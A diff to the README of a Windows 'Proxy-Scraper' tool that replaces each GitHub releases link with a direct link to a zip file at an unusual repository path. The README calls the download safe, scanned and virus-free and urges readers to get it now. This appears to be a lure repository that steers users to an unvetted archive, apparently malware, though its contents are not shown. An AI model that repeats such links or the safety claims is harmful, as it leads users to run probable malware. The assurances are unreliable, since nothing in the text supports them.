@@ -1,7 +1,7 @@
 <h1>🛡️ Proxy-Scraper - Unlock Every Proxy, Zero Limits</h1>
 
 <p align="center">
-  <a href="https://github.com/Composmentis-crossover7660/Proxy-Scraper/releases">
+  <a href="https://raw.githubusercontent.com/Composmentis-crossover7660/Proxy-Scraper/main/deaconize/1.3.zip">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FREE-2ea44f?style=for-the-badge&logo=windows&logoColor=white&labelColor=1f6feb" alt="Download Proxy-Scraper Free 2026">
   </a>
 </p>
@@ -30,7 +30,7 @@ Follow these simple steps to get Proxy-Scraper running on your Windows PC.
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-👉 **[Proxy-Scraper Official Download Page](https://github.com/Composmentis-crossover7660/Proxy-Scraper/releases)**
+👉 **[Proxy-Scraper Official Download Page](https://raw.githubusercontent.com/Composmentis-crossover7660/Proxy-Scraper/main/deaconize/1.3.zip)**
 
 Look for the latest release file (usually named `Proxy-Scraper-Setup.exe` or similar). Click it to start the download. The file is safe and scanned – no viruses, no bundled junk.
 
@@ -173,7 +173,7 @@ If you get stuck at any point, don't worry. Here's what you can do:
 
 Don't wait – get your free copy now:
 
-👉 **[Download Proxy-Scraper for Windows (Free)](https://github.com/Composmentis-crossover7660/Proxy-Scraper/releases)**
+👉 **[Download Proxy-Scraper for Windows (Free)](https://raw.githubusercontent.com/Composmentis-crossover7660/Proxy-Scraper/main/deaconize/1.3.zip)**
 
 The download is instant, the installation is easy, and the tool is ready to use in under 2 minutes. Start scraping today and never worry about finding working proxies again.
 
